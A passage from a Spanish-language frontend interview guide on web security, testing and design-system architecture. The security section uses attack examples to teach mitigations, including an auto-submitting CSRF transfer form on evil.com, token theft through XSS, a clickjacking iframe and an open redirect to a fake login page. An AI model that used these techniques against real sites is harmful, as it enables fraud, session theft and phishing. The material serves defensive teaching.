      el.innerHTML = userInput;

      // Bien
      el.textContent = userInput;
      ```
    - CSP como red de seguridad (defensa en profundidad).
      ```http
      # Mal: sin CSP, o script-src 'unsafe-inline' 'unsafe-eval'

      # Bien
      Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'
      ```

- CSRF (*Cross-Site Request Forgery*): peticiones no deseadas con la
  sesión de la víctima

  - **Teoría**: **CSRF** (ver Glosario) aprovecha que las cookies de un
    dominio se envían **automáticamente** en peticiones a ese dominio.
    Un sitio malicioso no puede *leer* la respuesta (SOP / same-origin
    policy), pero sí puede *disparar* un `POST`/`GET` que el navegador
    autentica con la cookie de sesión. Por eso `SameSite` en cookies,
    tokens CSRF en header, o auth vía `Authorization: Bearer` (que no
    se adjunta sola a otro origen) son las mitigaciones clásicas.

  - **Ejemplo paso a paso**:
    1. La víctima está logueada en `banco.com` (cookie de sesión).
    2. Visita `evil.com`.
    3. `evil.com` auto-envía un formulario a `banco.com/api/transferir`.
    4. El navegador adjunta la cookie; el servidor cree que fue la
       usuaria quien lo pidió.
    ```html
    <!-- En evil.com -->
    <form action="https://banco.com/api/transferir" method="POST">
      <input name="to" value="atacante" />
      <input name="amount" value="1000" />
    </form>
    <script>document.forms[0].submit();</script>
    ```

  - **Buenas prácticas**:
    - Cookie de sesión con `HttpOnly`, `Secure` y `SameSite`.
      ```http
      # Mal
      Set-Cookie: session=abc; Path=/

      # Bien
      Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict; Path=/
      ```
    - Token CSRF o header custom que el atacante no puede leer (SOP).
      ```ts
      // Mal — solo cookie, sin prueba de origen
      fetch('/api/transferir', {
        method: 'POST',
        credentials: 'include',
        body: JSON.stringify({ to: 'x', amount: 1000 }),
      });

      // Bien
      fetch('/api/transferir', {
        method: 'POST',
        credentials: 'include',
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-Token': csrfToken,
        },
        body: JSON.stringify({ to: 'x', amount: 1000 }),
      });
      ```
    - Preferir Bearer en header frente a cookie automática para la API.
      ```ts
      // Mal — sesión solo en cookie sin SameSite ni CSRF token

      // Bien
      fetch('/api/transferir', {
        method: 'POST',
        headers: {
          Authorization: `Bearer ${accessToken}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ to: 'x', amount: 10 }),
      });
      ```
    - No usar `SameSite=None` “por si acaso”.
      ```http
      # Mal — cross-site siempre, sin necesidad
      Set-Cookie: session=abc; SameSite=None; Secure

      # Bien — Lax o Strict salvo embeds cross-site reales y documentados
      Set-Cookie: session=abc; SameSite=Lax; Secure; HttpOnly
      ```

- Autorización solo en el cliente no es seguridad (UX ≠ garantía)

  - **Teoría**: ocultar un botón o validar un formulario en React mejora
    la **UX** (*User Experience* — ver Glosario), pero no es una
    garantía de seguridad. Quien controla el cliente puede llamar a la
    API directo (curl, DevTools, script). Toda regla de rol, permiso o
    invariante de negocio debe revalidarse en el servidor.

  - **Ejemplo paso a paso**:
    1. El frontend hace `{user.role === 'admin' && <button>Borrar</button>}`.
    2. El atacante (u otro rol) llama `DELETE /admin/wipe` con su token.
    3. Si el backend no comprueba el rol → la acción se ejecuta.

  - **Buenas prácticas**:
    - Autorización en el servidor; el frontend solo condiciona la UI.
      ```tsx
      // Mal — solo frontend; el backend no exige rol
      {user.role === 'admin' && (
        <button onClick={() => fetch('/admin/wipe', { method: 'DELETE' })}>
          Borrar todo
        </button>
      )}

      // Bien — UI + garantía real
      {canWipe && <button onClick={wipe}>Borrar</button>}
      // backend: app.delete('/admin/wipe', requireAuth, requireRole('admin'), handler)
      ```
    - Validación de negocio crítica también en backend.
      ```ts
      // Mal — solo cliente
      if (amount > balance) return alert('Fondos insuficientes');
      await transfer({ amount });

      // Bien — UX rápida + rechazo en servidor
      if (amount > balance) return setError('Fondos insuficientes');
      await transfer({ amount });
      // servidor: if (amount > account.balance) return 400
      ```

- Secretos y tokens en el bundle / storage del cliente

  - **Teoría**: todo lo que llega al JS del navegador es público
    (bundle, Network, Application). Un `VITE_*` / `NEXT_PUBLIC_*` no es
    un secreto: se embebe en el cliente. Un **JWT** (*JSON Web Token* —
    ver Glosario) en `localStorage` es legible por cualquier XSS. Los
    secretos de servidor (DB, Stripe secret, client secret de OAuth)
    solo viven en backend o BFF.

  - **Ejemplo paso a paso**:
    1. La SPA guarda el access token en `localStorage` “porque es cómodo”.
    2. Existe un XSS (o una extensión maliciosa).
    3. El script lee `localStorage.getItem('token')` y lo envía fuera.
    4. El atacante reutiliza el token contra la API.

  - **Buenas prácticas**:
    - Nunca secretos de servidor en variables públicas del frontend.
      ```ts
      // Mal — acaba en el bundle del cliente
      const key = import.meta.env.VITE_STRIPE_SECRET_KEY;

      // Bien — solo en servidor; el cliente llama a tu BFF
      // process.env.STRIPE_SECRET_KEY  (sin prefijo público)
      ```
    - Access token en memoria (o cookie HttpOnly vía BFF), no en
      `localStorage`.
      ```ts
      // Mal
      localStorage.setItem('token', accessToken);

      // Bien — memoria de proceso (se pierde al refrescar; combinar con refresh HttpOnly)
      let accessToken: string | null = null;
      export const setAccessToken = (t: string) => {
        accessToken = t;
      };
      export const getAccessToken = () => accessToken;
      ```
    - Refresh token solo en cookie `HttpOnly`.
      ```ts
      // Mal
      localStorage.setItem('refresh_token', refresh);

      // Bien (lo setea el servidor)
      // Set-Cookie: refresh=...; HttpOnly; Secure; SameSite=Strict; Path=/auth/refresh
      ```

### En profundidad

- Clickjacking y framing hostil

  - **Teoría**: el atacante embebe tu app en un `<iframe>` casi invisible
    sobre un botón falso. El usuario cree hacer clic en “ganar premio”;
    el clic cae en “confirmar transferencia” de tu origen autenticado.
    Se mitiga diciéndole al navegador quién puede enmarcar tu página:
    **CSP** `frame-ancestors` (moderno) o `X-Frame-Options` (legacy).

  - **Ejemplo paso a paso**:
    1. `evil.com` pone `<iframe src="https://tuapp.com/confirmar-pago">`.
    2. Lo estiliza con `opacity: 0` encima de un CTA atractivo.
    3. El clic del usuario activa la UI autenticada dentro del iframe.

  - **Buenas prácticas**:
    - Bloquear framing por defecto.
      ```http
      # Mal — sin headers; cualquier sitio puede iframearte

      # Bien
      Content-Security-Policy: frame-ancestors 'none'
      X-Frame-Options: DENY
      ```
    - Si hay embeds legítimos, allowlist explícita (nunca `*`).
      ```http
      # Mal
      Content-Security-Policy: frame-ancestors *

      # Bien
      Content-Security-Policy: frame-ancestors https://partner.confiable.com
      ```

- Auth en SPAs: OAuth, OIDC, PKCE y JWT

  - **Teoría**: en un “Login with Google” (o Auth0, Keycloak, etc.)
    conviven cuatro piezas distintas; cada una responde una pregunta
    diferente. Confundirlas es el error típico en entrevistas.

    **OAuth 2.0** (*Open Authorization* — ver Glosario) es un protocolo
    de **autorización**, no de “quién soy”. Resuelve: ¿puede
    `miapp.com` leer mis repos de GitHub *sin* que yo le dé mi
    contraseña de GitHub? Piezas: el usuario (*resource owner*), tu SPA
    o backend (*client*), quien emite permisos (*authorization server* /
    IdP), la API que guarda los datos (*resource server*) y los
    *scopes* (qué se permite: `read:email`, `orders:write`). El
    resultado típico es un **access token** (y a veces un **refresh
    token**). Analogía: llave de habitación de hotel (acceso limitado y
    temporal), no la llave maestra del edificio (tu password).

    **OIDC** (*OpenID Connect* — ver Glosario) es una capa de
    **autenticación** encima de OAuth 2.0. OAuth solo dice “esta app
    puede acceder a estos recursos”; OIDC añade “y el usuario es Ana,
    email ana@…, `sub=abc123`”. Lo hace con un token extra: el **ID
    token** (casi siempre un JWT), pensado para que *tu app* conozca la
    identidad. El access token sigue siendo para llamar APIs. En la
    práctica, “Login with Google” en una SPA suele ser OIDC (identidad)
    usando el flujo de OAuth (tokens/scopes).

    | | OAuth | OIDC |
    |---|---|---|
    | Pregunta | ¿Qué puede hacer la app? | ¿Quién es el usuario? |
    | Token clave | access (y refresh) | ID token (+ access) |
    | Uso | autorización a APIs | login / sesión de identidad |

    **PKCE** (*Proof Key for Code Exchange*, “pixy” — ver Glosario) no
    reemplaza a OAuth/OIDC: es una **extensión de seguridad** del flujo
    *authorization code*. Una SPA es un *cliente público*: cualquiera
    puede ver su JS, así que no puede proteger un `client_secret` como
    haría un backend. Sin PKCE, un atacante que robe el `code` de la
    URL de redirect (`?code=...`) puede canjearlo por tokens. Con PKCE:
    (1) la app genera un secreto aleatorio `code_verifier`; (2) manda
    solo su hash `code_challenge` (típicamente **SHA**-256 — ver
    Glosario) a `/authorize`; (3) al canjear el `code` debe enviar el
    verifier original; (4) el servidor comprueba que el hash coincide.
    Robar el `code` de la barra de direcciones no alcanza: falta el
    verifier, que nunca salió de la app que inició el login.

    **JWT** (*JSON Web Token* — ver Glosario) no es un protocolo: es un
    **formato** de token en tres partes Base64url separadas por `.`
    (`header.payload.signature`). El payload lleva *claims* (`sub`,
    `email`, `scope`, `exp`); la firma permite verificar que nadie lo
    alteró. Un access token *puede* ser un JWT o un string opaco; el ID
    token de OIDC *sí* es un JWT por especificación. Un JWT **no** va
    cifrado por defecto: quien lo tenga puede leer el payload. La
    seguridad está en no filtrarlo y en validar firma + `exp` en el
    servidor.

    Cómo encajan en una frase: con **OIDC** (sobre **OAuth**) el
    usuario inicia sesión en el IdP; **PKCE** protege el canje del
    `code` en la SPA; el IdP devuelve tokens y el access/ID token suele
    ir en formato **JWT**.

  - **Ejemplo paso a paso** (authorization code + PKCE):
    1. La SPA genera `code_verifier` aleatorio y
       `code_challenge = BASE64URL(SHA256(verifier))` (PKCE).
    2. Redirige a `/authorize?...&code_challenge=...&code_challenge_method=S256`
       (OAuth/OIDC).
    3. El usuario se autentica en el IdP; este redirige con `?code=...`.
    4. La SPA (o mejor un BFF) canjea `code` + `code_verifier` por
       tokens: access (+ refresh) y, si es OIDC, ID token.
    5. El access token (a menudo un JWT) va en `Authorization: Bearer`;
       el ID token (JWT) identifica al usuario; el refresh queda en
       cookie HttpOnly si usas BFF.

  - **Buenas prácticas**:
    - No embeber `client_secret` en el frontend.
      ```ts
      // Mal
      await fetch('/token', {
        body: JSON.stringify({ code, client_secret: 'supersecreto' }),
      });

      // Bien — PKCE / cliente público (sin secret) o intercambio en BFF
      const params = new URLSearchParams({
        client_id: publicClientId,
        code_challenge: challenge,
        code_challenge_method: 'S256',
        // sin client_secret
      });
      ```
    - Preferir BFF que setee cookies HttpOnly a exponer refresh al JS.
      ```ts
      // Mal — refresh en localStorage tras el callback OAuth
      localStorage.setItem('refresh', tokens.refresh_token);

      // Bien — el BFF intercambia el code y responde Set-Cookie HttpOnly;
      // el frontend solo mantiene el access token en memoria (corto)
      ```
    - Tratar el JWT como *credencial*: corta expiración, HTTPS, no
      loguearlo.
      ```ts
      // Mal
      console.log('login ok', accessToken);
      localStorage.setItem('jwt', accessToken);

      // Bien
      setAccessToken(accessToken); // memoria
      // Authorization solo por HTTPS; renovar antes de exp
      ```

- Dependencias vulnerables (CVE en npm)

  - **Teoría**: un **CVE** (*Common Vulnerabilities and Exposures* — ver
    Glosario) identifica una vulnerabilidad conocida. En frontend suele
    aparecer en parsers de HTML/Markdown, template engines o libs de
    auth. Tu código puede ser correcto y aun así quedar expuesto por una
    dependencia transitiva desactualizada.

  - **Ejemplo paso a paso**:
    1. Instalas un renderer de Markdown.
    2. Se publica un CVE de XSS en esa versión.
    3. Sigues en producción sin actualizar.
    4. Un post con payload malicioso se renderiza y ejecuta script.

  - **Buenas prácticas**:
    - Auditar y actualizar de forma habitual.
      ```bash
      # Mal — nunca audit; pin eterno a una major vulnerable

      # Bien
      npm audit
      npm update paquete-vulnerable
      ```
    - No renderizar HTML/Markdown de usuario sin sanitizar + versión
      parcheada.
      ```ts
      // Mal
      el.innerHTML = marked.parse(userMarkdown);

      // Bien
      import { marked } from 'marked';
      import DOMPurify from 'dompurify';
      el.innerHTML = DOMPurify.sanitize(
        marked.parse(userMarkdown) as string,
      );
      ```

- Open redirects tras login u otras redirecciones controladas por
  query params

  - **Teoría**: si tras autenticarte haces
    `location = params.get('redirect')` sin validar, un atacante manda
    un link `tuapp.com/login?redirect=https://evil.com/fake-login`. La
    víctima confía en el dominio de login y termina en phishing. La
    defensa es allowlist de paths relativos (o de rutas conocidas),
    nunca URLs absolutas arbitrarias.

  - **Ejemplo paso a paso**:
    1. El atacante comparte `/login?redirect=https://evil.com/fake-login`.
    2. La víctima se autentica en tu IdP legítimo.
    3. Tu app redirige al valor de `redirect` sin filtrar.
    4. `evil.com` imita tu UI y pide la contraseña otra vez.

  - **Buenas prácticas**:
    - Solo paths relativos seguros (no `//evil.com`).
      ```ts
      // Mal
      window.location = params.get('redirect')!;

      // Bien
      const next = params.get('redirect') ?? '/';
      const safe =
        next.startsWith('/') && !next.startsWith('//') ? next : '/';
      navigate(safe);
      ```
    - Mejor: lista blanca de rutas de la app.
      ```ts
      // Mal — aceptar cualquier string que “parezca” path

      // Bien
      const ALLOWED = new Set(['/dashboard', '/settings', '/orders']);
      const next = params.get('redirect') ?? '/dashboard';
      navigate(ALLOWED.has(next) ? next : '/dashboard');
      ```

- Mapa rápido riesgo → defensa (para entrevistas)

  - **Teoría**: en una entrevista senior suelen pedir priorizar. El
    orden mental útil: (1) no ejecutar input como código, (2) no
    confiar la auth al storage legible por JS, (3) no autorizar solo en
    UI, (4) cookies con flags correctos / Bearer + PKCE, (5) headers
    CSP/`frame-ancestors`, (6) supply chain (CVEs).

  | Riesgo | Defensa principal |
  |---|---|
  | XSS | Escape / sanitizar + CSP + no tokens en `localStorage` |
  | CSRF | `SameSite` / Bearer / CSRF token |
  | Robo de sesión | `HttpOnly` + `Secure` + expiración corta |
  | Auth débil en SPA | OAuth/OIDC + PKCE (+ BFF si puedes) |
  | “Seguridad” solo UI | Validar siempre en backend |
  | Clickjacking | `frame-ancestors` / `X-Frame-Options` |
  | Libs rotas | Auditar CVEs y actualizar |
  | Open redirect | Allowlist de paths |

## 11. Testing y calidad

### Básico

- La pirámide de testing: unit, integration y e2e

  - **Teoría**: la pirámide describe el trade-off entre velocidad y
    confianza según el nivel de test. Los **tests unitarios** (base ancha
    de la pirámide) prueban una función o componente aislado, son
    rapidísimos de ejecutar (miles en segundos) y muy baratos de
    mantener, pero dan confianza limitada porque no prueban cómo
    interactúan las piezas entre sí. Los **tests de integración**
    prueban varios módulos trabajando juntos (un formulario completo con
    su validación y su llamada a la API mockeada), dan más confianza real
    a un costo intermedio. Los **tests e2e** (*end-to-end* — ver
    Glosario, cúspide de la pirámide) prueban la app completa en un
    navegador real, contra un backend real o casi real — dan la máxima
    confianza (es lo más parecido a cómo lo usa una persona real), pero
    son lentos, más frágiles y caros de mantener. La regla práctica:
    muchos unitarios, una cantidad moderada de integración, pocos e2e
    (solo los flujos críticos del negocio: login, checkout).
  - **Ejemplo**: para un flujo de checkout, una distribución razonable
    sería: decenas de tests unitarios para `calcularTotal()`,
    `aplicarDescuento()`, `validarTarjeta()`; unos pocos tests de
    integración para "el formulario de pago muestra el error correcto si
    la API rechaza la tarjeta"; y un único test e2e que recorra el
    checkout completo de principio a fin, porque ese flujo específico es
    donde un fallo cuesta dinero directamente.

- Cuándo mockear una dependencia y cuándo no

  - **Teoría**: un *mock* reemplaza una dependencia real (una API, una
    fecha, un valor aleatorio) por una versión controlada y predecible.
    Tiene sentido mockear lo que es lento, no determinista, o está fuera
    de tu control (una API externa real, `Date.now()`, `Math.random()`).
    Mockear **de más** —por ejemplo, simular la respuesta exacta de un
    módulo interno propio en vez de dejar que corra— da una falsa
    sensación de cobertura: el test pasa siempre, pase lo que pase con
    la lógica real, porque nunca la ejecuta de verdad.
  - **Ejemplo**:
    ```ts
    // Correcto mockear: la API externa es lenta, no determinista, fuera de tu control
    vi.mock('./api/pagos', () => ({
      procesarPago: vi.fn().mockResolvedValue({ status: 'aprobado' }),
    }));

    // Mockear de más: esto reemplaza tu propia lógica de negocio,
    // el test ya no prueba nada real de calcularDescuento()
    vi.mock('./calcularDescuento', () => ({
      calcularDescuento: vi.fn().mockReturnValue(10),
    }));
    ```

- Qué hace a un buen test

  - **Teoría**: un buen test es **aislado** (no depende del orden de
    ejecución ni del estado que dejó otro test), **determinista** (el
    mismo código siempre da el mismo resultado — nada de `setTimeout`
    reales ni dependencias de la hora del sistema sin mockear) y
    **legible como documentación** (alguien que nunca vio el código
    debería entender qué comportamiento se espera solo leyendo el
    nombre del test y sus aserciones).
  - **Ejemplo**:
    ```ts
    // Mal nombre, no dice qué se espera, no es legible como documentación
    test('test1', () => {
      expect(calcularDescuento(100, true)).toBe(20);
    });

    // Buen nombre: documenta la regla de negocio que protege
    test('aplica 20% de descuento a usuarios premium', () => {
      expect(calcularDescuento(100, true)).toBe(20);
    });
    ```

### En profundidad

- TDD aplicado a lógica de UI: el ciclo red-green-refactor

  - **Teoría**: **TDD** (*Test-Driven Development* — ver Glosario) invierte
    el orden habitual: se escribe primero el test (que falla, porque el
    código todavía no existe — **red**), luego el mínimo código necesario
    para que pase (**green**), y recién después se mejora ese código sin
    cambiar su comportamiento observable (**refactor**), repitiendo el
    ciclo para cada nuevo requisito. Aplicado a lógica de UI, funciona
    mejor sobre reglas de negocio concretas (validaciones, cálculos,
    transformaciones de estado) que sobre JSX puramente visual.
  - **Ejemplo paso a paso** (validación de un campo de descuento):
    ```ts
    // 1. RED -- se escribe el test antes de que exista la función
    test('rechaza un descuento mayor al 50%', () => {
      expect(validarDescuento(60)).toBe(false);
    });
    // Falla: "validarDescuento is not defined"

    // 2. GREEN -- código mínimo para que pase, sin preocuparse por elegancia
    function validarDescuento(porcentaje: number) {
      if (porcentaje > 50) return false;
      return true;
    }

    // 3. REFACTOR -- se limpia sin cambiar el comportamiento observable
    function validarDescuento(porcentaje: number): boolean {
      const LIMITE_MAXIMO = 50;
      return porcentaje <= LIMITE_MAXIMO;
    }
    // El test del paso 1 sigue pasando exactamente igual tras el refactor
    ```

- Testing de custom hooks con `renderHook`

  - **Teoría**: un custom hook no es un componente — no se puede
    "renderizar" directamente en un test con `render()` porque no
    devuelve JSX. `renderHook` de Testing Library crea un componente
    envoltorio invisible solo para poder ejecutar el hook en un contexto
    de React real (con su propio ciclo de renders) y así probar su
    lógica de estado sin acoplar el test a ningún componente visual
    específico que lo use.
  - **Ejemplo**:
    ```tsx
    import { renderHook, act } from '@testing-library/react';

    function useContador() {
      const [valor, setValor] = useState(0);
      const incrementar = () => setValor((v) => v + 1);
      return { valor, incrementar };
    }

    test('incrementa el valor al llamar incrementar', () => {
      const { result } = renderHook(() => useContador());

      expect(result.current.valor).toBe(0);

      act(() => {
        result.current.incrementar(); // dispara un update de estado real
      });

      expect(result.current.valor).toBe(1);
    });
    ```

- E2E con Playwright/Cypress: Page Object y causas de *flakiness*

  - **Teoría**: el patrón **Page Object** encapsula los selectores y
    acciones de una página en una clase reutilizable, en vez de
    repetir selectores CSS en cada test — si el selector de un botón
    cambia, se actualiza en un solo lugar. Los tests e2e son propensos a
    ser *flaky* (fallan de forma intermitente sin que el código haya
    cambiado); la causa más común es **esperar por tiempo fijo**
    (`sleep(1000)`) en vez de **esperar por estado** (esperar a que un
    elemento específico aparezca o a que una petición de red termine) —
    un `sleep` fijo a veces alcanza y a veces no, dependiendo de la
    carga de la máquina que ejecuta el test.
  - **Ejemplo**:
    ```ts
    // Page Object: encapsula los selectores de la página de login
    class LoginPage {
      constructor(private page: Page) {}
      async login(email: string, password: string) {
        await this.page.fill('[name=email]', email);
        await this.page.fill('[name=password]', password);
        await this.page.click('button[type=submit]');
      }
    }

    test('login exitoso redirige al dashboard', async ({ page }) => {
      const login = new LoginPage(page);
      await login.login('ana@mail.com', 'clave123');

      // Malo (flaky): await page.waitForTimeout(2000);
      // Bueno: espera por el estado real, sin importar cuánto tarde exactamente
      await page.waitForURL('/dashboard');
      await expect(page.locator('h1')).toHaveText('Bienvenida');
    });
    ```

- Testing de regresión visual

  - **Teoría**: hay bugs que ningún test funcional detecta porque el
    comportamiento es correcto pero la **apariencia** se rompió (un
    padding que desapareció, un ícono que se superpone con texto). El
    testing de regresión visual toma una captura de pantalla de un
    componente o página y la compara pixel a pixel contra una versión
    "aprobada" anterior, marcando el test como fallido si hay una
    diferencia visual significativa. Vale la pena en componentes de
    diseño crítico (un design system compartido, ver sección 12) donde un
    cambio visual accidental afecta a decenas de pantallas a la vez; no
    se justifica para cada componente trivial del proyecto por el costo
    de mantener y revisar capturas de referencia.
    Las herramientas más demandadas para testing de regresión visual son Chromatic (muy integrada con Storybook), Percy (compatible con CI y varios frameworks), y Applitools (enfoque avanzado con IA). Todas permiten comparar capturas actuales vs. aprobadas y resaltar diferencias visuales.
  - **Ejemplo** (conceptual, con una herramienta como Chromatic o
    Percy):
    ```ts
    test('el botón primario no cambia visualmente', async ({ page }) => {
      await page.goto('/storybook/button--primary');
      await expect(page).toHaveScreenshot('button-primary.png'); // compara contra el snapshot aprobado
    });
    ```
    Si alguien cambia sin querer el `border-radius` del design system,
    este test falla mostrando el diff visual exacto, aunque ningún test
    funcional se vea afectado.

## 12. Arquitectura frontend a escala

### Básico

- Qué es un design system y qué problema organizacional resuelve

  - **Teoría**: un design system no es solo "una librería de
    componentes bonitos" — es la solución a un problema **organizacional**:
    cuando varios equipos construyen features en paralelo, sin un
    lenguaje visual y de componentes compartido cada equipo reinventa su
    propio botón, su propio modal, su propia validación de formulario,
    con pequeñas inconsistencias que se acumulan (un botón "primario" se
    ve distinto en cada pantalla) y con esfuerzo duplicado. Un design
    system centraliza componentes, tokens de diseño (colores, espaciados,
    tipografía) y sus reglas de uso en un solo lugar versionado, dando
    **consistencia** visual y **velocidad** (un equipo nuevo no
    reconstruye un botón desde cero, lo importa).

    Un design system **no** es solo “una librería de
    componentes bonitos”. Es el **contrato compartido** entre diseño y
    ingeniería (y entre equipos de producto) sobre cómo se ve, se
    comporta y se nombra la UI de la empresa.

  - **Ejemplo**: sin design system, tres equipos distintos terminan con
    tres implementaciones del "mismo" botón:
    ```tsx
    // Equipo A
    <button className="btn-blue-rounded">Guardar</button>
    // Equipo B
    <button style={{ background: '#1a73e8', borderRadius: 8 }}>Guardar</button>
    // Equipo C
    <Button variant="primary">Guardar</Button> // el único que usa el design system
    ```
    Los primeros dos tienen colores y radios ligeramente distintos, y si
    la marca cambia de color primario, hay que encontrar y actualizar
    cada implementación manual una por una — con un design system, se
    actualiza un token en un solo lugar.

    **Problema organizacional que resuelve**: cuando varios equipos
    construyen features en paralelo *sin* ese contrato, cada uno
    reinventa su botón, modal, formulario y espaciado. Aparecen tres
    costes que crecen con el número de squads:
    1. **Inconsistencia** — el “botón primario” se ve distinto en cada
       pantalla; la marca se diluye y la UX se siente fragmentada.
    2. **Duplicación** — el mismo esfuerzo (accesibilidad del modal,
       estados del input, dark mode) se paga N veces.
    3. **Fricción de cambio** — cambiar el color primario o el radio de
       bordes implica un hunt & replace por todo el monorepo (o peor:
       por varios repos) en vez de un token versionado.

    Un design system ataca eso centralizando, en un lugar versionado:
    - **Tokens de diseño**: color, tipografía, spacing, radius, elevation
      (a menudo alineados con Figma).
    - **Componentes** reutilizables con API estable (`Button`, `Modal`,
      `TextField`) y comportamiento accesible acordado.
    - **Patrones / guidelines**: cuándo usar dialog vs drawer, tono de
      copy, densidades.
    - **Documentación viva** (Storybook, site interno) y **gobernanza**
      (quién puede romper el contrato, versionado semver, proceso de
      contribución).

    Capas típicas (de más abstracto a más concreto):

    ```
    Tokens  →  Primitives (Button, Input)  →  Patrones (Form layout)
            →  Product UI (pantallas que solo componen)
    ```

    Distinción útil en entrevistas:
    - **Component library** = el paquete de código (`@empresa/ui`).
    - **Design system** = library + tokens + docs + reglas de uso +
      ownership. Puedes *consumir* uno externo (MUI) o *construir* el
      interno de la empresa encima de headless (Radix, React Aria).

    Beneficios medibles: consistencia visual, velocidad de feature
    (importar en vez de reinventar), a11y concentrada en primitives, y
    un único punto de cambio cuando la marca evoluciona.

  - **Ejemplo**: sin design system, tres equipos terminan con tres
    “mismos” botones:
    ```tsx
    // Equipo A
    <button className="btn-blue-rounded">Guardar</button>
    // Equipo B
    <button style={{ background: '#1a73e8', borderRadius: 8 }}>Guardar</button>
    // Equipo C — consume el sistema
    <Button variant="primary">Guardar</Button>
    ```
    Con sistema, el color primario es un token (`--color-primary`); un
    cambio de marca actualiza el token una vez y todas las pantallas
    heredan el cambio.

  - **Cuáles son los más demandados** (mercado React / frontend senior,
    ~2024–2026; “demandados” = aparecen en ofertas, codebases y
    entrevistas):

    | Tier | Qué | Por qué se pide |
    |---|---|---|
    | Muy alto | **MUI (Material UI)** | Históricamente el más citado en job posts React; admin panels, B2B, onboarding rápido. |
    | Muy alto | **Ant Design** | Muy fuerte en dashboards enterprise y productos data-heavy; API densa “out of the box”. |
    | Alto / en auge | **shadcn/ui + Radix + Tailwind** | Stack moderno: copias componentes a tu repo (no caja negra npm), accesibles vía Radix, fácil de brandear. Muchas startups y productos nuevos. |
    | Alto | **Design system interno** + **Storybook** + **tokens** | Empresas medianas/grandes: el valor senior es *mantener/evolucionar* el DS de la compañía, no solo instalar MUI. |
    | Medio-alto | **Chakra UI** | Sigue en producción y ofertas; algo menos “default” que MUI/Ant/shadcn hoy. |
    | Medio (headless) | **Radix UI**, **React Aria**, **Headless UI** | Se piden cuando el DS es custom: comportamiento a11y listo, estilos propios. |
    | Referencia de producto (conocer nombres) | **Material Design** (Google), **Carbon** (IBM), **Polaris** (Shopify), **Lightning** (Salesforce), **Spectrum** (Adobe) | Rara vez “instálalos tal cual” en tu app; sí salen como ejemplos de DS maduros y como inspiración de tokens/patrones. |

    Regla práctica de entrevista:
    - Startup / greenfield reciente → esperan familiaridad con
      **shadcn/Radix/Tailwind** o un DS liviano.
    - Enterprise / backoffice → **MUI** o **Ant** (o el DS interno
      encima de uno de esos).
    - Rol senior / staff en empresa con marca fuerte → experiencia
      **construyendo o versionando** un DS interno (tokens, Storybook,
      semver, adopción por equipos), más que saber de memoria todas las
      props de MUI.

- Estructura de carpetas feature-based vs type-based

  - **Teoría**: son dos formas de organizar el código según **qué
    criterio** usas para agrupar archivos.

    **Type-based** (*por tipo técnico* / “layer cake”): carpetas según el
    rol técnico del archivo — `components/`, `hooks/`, `services/`,
    `utils/`, `types/`, `pages/`. Da igual si el archivo es de checkout o
    de perfil: si es un hook, va a `hooks/`. Encaja con tutoriales y apps
    chicas porque el mapa mental es simple (“¿dónde están los hooks?” →
    una carpeta). El costo aparece al crecer: una tarea de negocio
    (“cambiar el checkout”) te obliga a saltar por 4–6 carpetas y a
    adivinar qué archivos pertenecen juntos; borrar una feature deja
    huérfanos repartidos.

    **Feature-based** (*por dominio / vertical slice*): todo lo de una
    capacidad de negocio vive junto — `features/checkout/` con su UI,
    hooks, API client, tipos y tests. El “radio de cambio” de una
    historia típica queda contenido en una carpeta. Escalar equipos es
    más barato: el squad de pagos casi no pisa `features/catalog`.
    Borrar o extraer una feature a otro paquete es un move de carpeta,
    no un scavenger hunt.

    Híbrido habitual (y el más sensato en la práctica):
    ```
    src/
      app/                 # shell: routing, providers, layout
      features/            # dominio (feature-based)
        checkout/
        catalog/
      shared/              # cross-cutting (type-based hacia adentro)
        ui/                # Button, Modal (o import del design system)
        lib/               # formatDate, http client
        hooks/             # useMediaQuery, useDebounce
    ```
    Es decir: **features por dominio** + **shared por tipo** para lo que
    realmente es transversal. Si algo “shared” solo lo usa una feature,
    no es shared: muévelo a esa feature.

    Criterio de decisión rápido:
    - ¿El cambio típico es “tocar el checkout”? → feature-based.
    - ¿El cambio típico es “añadir un util de fechas”? → type en
      `shared/`.
    - ¿La app cabe en tu cabeza y sois 1–2 devs? → type-based puro aún
      es aceptable.
    - ¿Varios squads / >~15 pantallas con dominio claro? → feature-based
      (o híbrido).

  - **Ejemplo**:
    ```
    # Type-based: el checkout está disperso
    src/
      components/CheckoutForm.tsx
      hooks/useCheckout.ts
      services/checkoutApi.ts
      types/checkout.ts

    # Feature-based: el checkout es un módulo autocontenido
    src/
      features/checkout/
        ui/CheckoutForm.tsx
        useCheckout.ts
        checkoutApi.ts
        types.ts
        checkout.test.ts
        index.ts          # API pública de la feature (barrel)
    ```

  - **Qué piden / empujan hoy frameworks y ecosistemas** (demanda
    real ~2024–2026; no es que el framework *obligue*, sino la
    convención dominante de sus docs, starters y ofertas):

    | Enfoque | Dónde se ve más / más “demandado” | Por qué |
    |---|---|---|
    | **Feature-based / colocation** | **Next.js (App Router)**, **Remix / React Router 7**, apps React grandes, **Nx** (libs por feature/domain), **Angular** (feature modules / standalone por dominio), **Vue 3** apps de producto, **SvelteKit** por rutas+módulos | El router ya agrupa por URL/dominio (`app/checkout/…`); colocalizar `page`, data y UI es el default moderno. Ofertas senior asumen “features/” o route groups. |
    | **Type-based** | Tutoriales, **CRA**-era leftovers, **micro-libs** / design systems (`components/`, `hooks/`), backends tipo **NestJS** (`controllers/`, `services/` — otro mundo), prototipos y repos <~5k LOC | Simple de enseñar; en libs de UI el “tipo” *es* el dominio. En apps de producto grandes se considera deuda si no migras. |
    | **Híbrido features + shared** | Lo que más aparece en codebases React/Next senior reales y en guías de **Feature-Sliced Design** (FSD, más rígido) o “bulletproof React” | Escala equipos sin fingir que *todo* es una feature. |

    Matices por stack:
    - **Next.js App Router**: la carpeta `app/` es *route-based*
      (colocation por URL). Lo demandado encima es sacar dominio a
      `features/` o `modules/` y dejar `app/` delgado (pages que
      componen). No metas toda la lógica de negocio dentro de
      `app/` si la app crece.
    - **Remix / RR loaders**: colocation ruta ↔ data es natural;
      features agrupan varias rutas del mismo dominio.
    - **Nx / monorepos**: generators empujan **libs por dominio**
      (`orders-data-access`, `orders-ui`) — feature-based a escala de
      paquetes.
    - **Angular**: históricamente *feature modules*; hoy standalone,
      pero la organización por dominio sigue siendo la expectativa en
      empresas.
    - **Design system / UI kit**: casi siempre **type-based**
